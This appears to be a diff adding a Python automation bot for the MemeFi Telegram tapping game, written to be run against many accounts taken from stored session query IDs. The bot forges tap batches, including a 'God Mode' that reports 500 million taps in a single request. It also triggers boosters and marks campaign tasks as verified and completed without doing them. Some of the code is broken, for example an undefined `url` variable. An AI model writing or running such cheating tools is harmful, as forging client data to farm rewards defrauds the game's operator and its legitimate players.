+    url = "api-gw-tg.memefi.club"
+
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+
+    json_payload = {
+        "operationName": "QueryTelegramUserMe",
+        "variables": {},
+        "query": QUERY_USER
+    }
+
+    response = safe_post(url, headers, json_payload)
+    if response and 'errors' not in response:
+        user_data = response['data']['telegramUserMe']
+        return user_data  # Mengembalikan hasil response
+    else:
+        print(f"❌ Failed status {response}")
+        return None  # Mengembalikan None jika terjadi error
+
+def activate_energy_recharge_booster(index, headers):
+    access_token = fetch(index + 1)
+    url = "api-gw-tg.memefi.club"
+
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+
+    recharge_booster_payload = {
+        "operationName": "telegramGameActivateBooster",
+        "variables": {"boosterType": "Recharge"},
+        "query": QUERY_BOOSTER
+    }
+
+    response = safe_post(url, headers, recharge_booster_payload)
+    if response and 'data' in response and response['data'] and 'telegramGameActivateBooster' in response['data']:
+        new_energy = response['data']['telegramGameActivateBooster']['currentEnergy']
+        print(f"\n🔋 Energy is charged. Current energy: {new_energy}")
+    else:
+        print("❌ Failed to activate Recharge Booster: Incomplete or missing data.")
+
+def activate_booster(index, headers):
+    access_token = fetch(index + 1)
+    url = "api-gw-tg.memefi.club"
+    print("\r🚀 Activating Turbo Boost ... ", end="", flush=True)
+
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+
+    recharge_booster_payload = {
+        "operationName": "telegramGameActivateBooster",
+        "variables": {"boosterType": "Turbo"},
+        "query": QUERY_BOOSTER
+    }
+
+    response = safe_post(url, headers, recharge_booster_payload)
+    if response and 'data' in response:
+        current_health = response['data']['telegramGameActivateBooster']['currentBoss']['currentHealth']
+        current_level = response['data']['telegramGameActivateBooster']['currentBoss']['level']
+        if current_health == 0:
+            print("\nThe boss has been defeated, set the next boss...")
+            set_next_boss(index, headers)
+        else:
+            if god_mode == 'y':
+                total_hit = 500000000
+            else:
+                total_hit = 500000
+            tap_payload = {
+                "operationName": "MutationGameProcessTapsBatch",
+                "variables": {
+                    "payload": {
+                        "nonce": generate_random_nonce(),
+                        "tapsCount": total_hit
+                    }
+                },
+                "query": MUTATION_GAME_PROCESS_TAPS_BATCH
+            }
+            for _ in range(50):
+                tap_result = submit_taps(index, tap_payload)
+                if tap_result is not None:
+                    if 'data' in tap_result and 'telegramGameProcessTapsBatch' in tap_result['data']:
+                        tap_data = tap_result['data']['telegramGameProcessTapsBatch']
+                        if tap_data['currentBoss']['currentHealth'] == 0:
+                            print("\nThe boss has been defeated, set the next boss...")
+                            set_next_boss(index, headers)
+                            print(f"\rTapped ✅ Coin: {tap_data['coinsAmount']}, Monster ⚔️: {tap_data['currentBoss']['currentHealth']} - {tap_data['currentBoss']['maxHealth']}    ")
+                else:
+                    print(f"❌ Failed with status {tap_result}, Try again...")
+    else:
+        print(f"❌ Failed with status {response}, Try again...")
+
+def submit_taps(index, json_payload):
+    access_token = fetch(index + 1)
+    url = "api-gw-tg.memefi.club"
+
+    headers = headers_set.copy()
+    headers['Authorization'] = f'Bearer {access_token}'
+
+    response = safe_post(url, headers, json_payload)
+    if response:
+        return response  # Pastikan mengembalikan data yang sudah diurai
+    else:
+        print(f"❌ Failed with status {response}, Try again...")
+        return None  # Mengembalikan None jika terjadi error
+
+def set_next_boss(index, headers):
+    access_token = fetch(index + 1)
+    url = "api-gw-tg.memefi.club"
+
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+    boss_payload = {
+        "operationName": "telegramGameSetNextBoss",
+        "variables": {},
+        "query": QUERY_NEXT_BOSS
+    }
+
+    response = safe_post(url, headers, boss_payload)
+    if response and 'data' in response:
+        print("✅ Successfully changing bosses.", flush=True)
+    else:
+        print("❌ Failed to change bosses.", flush=True)
+
+# cek stat
+def cek_stat(index, headers):
+    access_token = fetch(index + 1)
+    url = "api-gw-tg.memefi.club"
+
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+
+    json_payload = {
+        "operationName": "QUERY_GAME_CONFIG",
+        "variables": {},
+        "query": QUERY_GAME_CONFIG
+    }
+
+    response = safe_post(url, headers, json_payload)
+    if response and 'errors' not in response:
+        user_data = response['data']['telegramGameGetConfig']
+        return user_data
+    else:
+        print(f"❌ Fails with status {response}")
+        return None  # Mengembalikan None jika terjadi error
+
+def check_and_complete_tasks(index, headers):
+    access_token = fetch(index + 1)
+    headers = headers_set.copy()  # Membuat salinan headers_set agar tidak mengubah variabel global
+    headers['Authorization'] = f'Bearer {access_token}'
+    task_list_payload = {
+        "operationName": "GetTasksList",
+        "variables": {"campaignId": "50ef967e-dd9b-4bd8-9a19-5d79d7925454"},
+        "query": QUERY_GET_TASK
+    }
+
+    response = safe_post(url, headers, task_list_payload)
+    if response and 'errors' not in response:
+        tasks = response
+    else:
+        print(f"❌ Fails with status {response}")
+        return False
+
+    all_completed = all(task['status'] == 'Completed' for task in tasks['data']['campaignTasks'])
+    if all_completed:
+        print(f"\r[ Akun {index + 1} ] All tasks have been completed. ✅            ", flush=True)
+        return True
+
+    print(f"\n[ Akun {index + 1} ]\nList Task:\n")
+    for task in tasks['data']['campaignTasks']:
+        print(f"{task['name']} | {task['status']}")
+
+        if task['name'] == "Follow telegram channel" and task['status'] == "Pending":
+            print(f"⏩ Skipping task: {task['name']}")
+            continue  # Skip task jika nama task adalah "Follow telegram channel" dan statusnya "Pending"
+
+        if task['status'] == "Pending":
+            print(f"\🔍 Viewing task: {task['name']}", end="", flush=True)
+
+            view_task_payload = {"operationName": "GetTaskById", "variables": {"taskId": task['id']}, "query": "fragment FragmentCampaignTask on CampaignTaskOutput {\n  id\n  name\n  description\n  status\n  type\n  position\n  buttonText\n  coinsRewardAmount\n  link\n  userTaskId\n  isRequired\n  iconUrl\n  __typename\n}\n\nquery GetTaskById($taskId: String!) {\n  campaignTaskGetConfig(taskId: $taskId) {\n    ...FragmentCampaignTask\n    __typename\n  }\n}"}
+            print(view_task_payload)
+            view_response = safe_post(url, headers, view_task_payload)
+            if 'errors' in view_response:
+                print(f"\r❌ Failed to get task details: {task['name']}")
+                print(view_response)
+            else:
+                task_details = view_response['data']['campaignTaskGetConfig']
+                print(f"\r🔍 Detail Task: {task_details['name']}", end="", flush=True)
+
+  
+
+            print(f"\r🔍 Task verification: {task['name']}                                                                ", end="", flush=True)
+            verify_task_payload = {
+                "operationName": "CampaignTaskToVerification",
+                "variables": {"userTaskId": task['userTaskId']},
+                "query": QUERY_TASK_VERIF
+            }
+            verify_response = safe_post(url, headers, verify_task_payload)
+            if 'errors' not in verify_response:
+                print(f"\r✅ {task['name']} | Moved to Verification", flush=True)
+            else:
+                print(f"\r❌ {task['name']} | Failed to move to Verification", flush=True)
+                print(verify_response)
+
+         
+
+    # Cek ulang task setelah memindahkan ke verification
+    updated_tasks = safe_post(url, headers, task_list_payload)
+    print("\nUpdated Task List After Verification:\n")
+    for task in updated_tasks['data']['campaignTasks']:
+        print(f"{task['name']} | {task['status']}")
+        if task['status'] == "Verification":
+            print(f"\r🔥 Complete tasks: {task['name']}", end="", flush=True)
+            complete_task_payload = {
+                "operationName": "CampaignTaskCompleted",
+                "variables": {"userTaskId": task['userTaskId']},
+                "query": QUERY_TASK_COMPLETED
+            }
+            complete_response = safe_post(url, headers, complete_task_payload)
+            if 'errors' not in complete_response:
+                print(f"\r✅ {task['name']} | Completed                         ", flush=True)
+            else:
+                print(f"\r❌ {task['name']} | Failed to complete            ", flush=True)
+
+   
+
+    return False
+
+def main():
+    print("Starting Memefi bot...")
+    print("\r Get a list of valid accounts...", end="", flush=True)
+  
+    while True:
+        with open('query_id.txt', 'r') as file:
+            lines = file.readlines()
+
+        # Kumpulkan informasi akun terlebih dahulu
+        accounts = []
+        for index, line in enumerate(lines):
+            result = cek_user(index)
+            if result is not None:
+                first_name = result.get('firstName', 'Unknown')
+                last_name = result.get('lastName', 'Unknown')
+                league = result.get('league', 'Unknown')
+                accounts.append((index, result, first_name, last_name, league))
+            else:
+                print(f"❌ Account {index + 1}: Token is invalid or an error occurred")
+
+        # Menampilkan daftar Account
+        print("\rList Account:                                   ", flush=True)
+        for index, _, first_name, last_name, league in accounts:
+            print(f"✅ [ Account {first_name} {last_name} ] | League 🏆 {league}")
+
+        # Setelah menampilkan semua akun, mulai memeriksa tugas
+        for index, result, first_name, last_name, league in accounts:
+            print(f"\r[ Account {index + 1} ] {first_name} {last_name} Check the task...", end="", flush=True)
+            headers = {'Authorization': f'Bearer {result}'}
+            if cek_task_enable == 'y':
+                check_and_complete_tasks(index, headers)
+            else:
+                print(f"\r\n[ Account {index + 1} ] {first_name} {last_name} Cek task skipped\n", flush=True)
+            stat_result = cek_stat(index, headers)
+
+            if stat_result is not None:
+                user_data = stat_result
+                output = (
+                    f"[ Account {index + 1} - {first_name} {last_name} ]\n"
+                    f"Coin 🪙  {user_data['coinsAmount']:,} 🔋 {user_data['currentEnergy']} - {user_data['maxEnergy']}\n"
+                    f"Level 🔫 {user_data['weaponLevel']} 🔋 {user_data['energyLimitLevel']} ⚡ {user_data['energyRechargeLevel']} 🤖 {user_data['tapBotLevel']}\n"
+                    f"Boss 👾 {user_data['currentBoss']['level']} ❤️ {user_data['currentBoss']['currentHealth']} - {user_data['currentBoss']['maxHealth']}\n"
+                    f"Free 🚀 {user_data['freeBoosts']['currentTurboAmount']} 🔋 {user_data['freeBoosts']['currentRefillEnergyAmount']}\n"
+                )
+                print(output, end="", flush=True)
+                level_bos = user_data['currentBoss']['level']
+                darah_bos = user_data['currentBoss']['currentHealth']
+
+                if darah_bos == 0:
+                    print("\nThe boss has been defeated, set the next boss...", flush=True)
+                    set_next_boss(index, headers)
+                print("\rTapping 👆", end="", flush=True)
+
+                energy_sekarang = user_data['currentEnergy']
+                energy_used = energy_sekarang - 100
+                damage = user_data['weaponLevel'] + 1
+                total_tap = energy_used // damage
+
+                if energy_sekarang < 0.25 * user_data['maxEnergy']:
+                    if auto_booster == 'y':
+                        if user_data['freeBoosts']['currentRefillEnergyAmount'] > 0:
+                            print("\r🪫 Energy Depleted, activate Recharge Booster... \n", end="", flush=True)
+                            activate_energy_recharge_booster(index, headers)
+                            continue  # Lanjutkan tapping setelah recharge
+                        else:
+                            print("\r🪫 Energy Depleted, no boosters available. Moving on to the next account.\n", flush=True)
+                            continue  # Beralih ke akun berikutnya
+                    else:
+                        print("\r🪫 Energy is out, auto booster disabled. Moving on to the next account.\n", flush=True)
+                        continue  # Beralih ke akun berikutnya
+
+                tap_payload = {
+                    "operationName": "MutationGameProcessTapsBatch",
+                    "variables": {
+                        "payload": {
+                            "nonce": generate_random_nonce(),
+                            "tapsCount": total_tap
+                        }
+                    },
+                    "query": MUTATION_GAME_PROCESS_TAPS_BATCH
+                }
+                tap_result = submit_taps(index, tap_payload)
+                if tap_result is not None:
+                    print(f"\rTapped ✅\n ")
+                else:
+                    print(f"❌ Failed with status {tap_result}, try again...")
+
+                if turbo_booster == 'y':
+                    if user_data['freeBoosts']['currentTurboAmount'] > 0:
+                        activate_booster(index, headers)
+
+        print("=== [ ALL ACCOUNTS HAVE BEEN PROCESSED ] ===")
+        print("=== [ SUBSCRIBE ME ON YOUTUBE - https://www.youtube.com/@D4rkCipherX ] ===")
+        animate_energy_recharge(15)
+
+# Jalankan fungsi main() dan simpan hasilnya
+
+def animate_energy_recharge(duration):
+    frames = ["|", "/", "-", "\\"]
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        remaining_time = int(end_time - time.time())
+        for frame in frames:
+            print(f"\r🪫 Recharge energy {frame} - Tersisa {remaining_time} second         ", end="", flush=True)
+            time.sleep(0.25)
+    print("\r🔋 Energy charging complete.                            ", flush=True)
+
+cek_task_enable = 'n'
+
+while True:
+    auto_booster = input("UPDATED BY @D4rkCipherX,Use Energy Booster (default n) ? (y/n): ").strip().lower()
+    if auto_booster in ['y', 'n', '']:
+        auto_booster = auto_booster or 'n'
+        break
+    else:
+        print("Enter 'y' or 'n'.")
+while True:
+    turbo_booster = input("Use Turbo Booster (default n) ? (y/n): ").strip().lower()
+    if turbo_booster in ['y', 'n', '']:
+        turbo_booster = turbo_booster or 'n'
+        break
+    else:
+        print("Enter 'y' or 'n'.")
+
+if turbo_booster == 'y':
+    while True:
+        god_mode = input("Activate God Mode (1x tap monster dead) ? (y/n): ").strip().lower()
+        if god_mode in ['y', 'n', '']:
+            god_mode = god_mode or 'n'
+            break
+        else:
+            print("Enter 'y' or 'n'.")
+
+# Jalankan fungsi main() dan simpan hasilnya
+main()
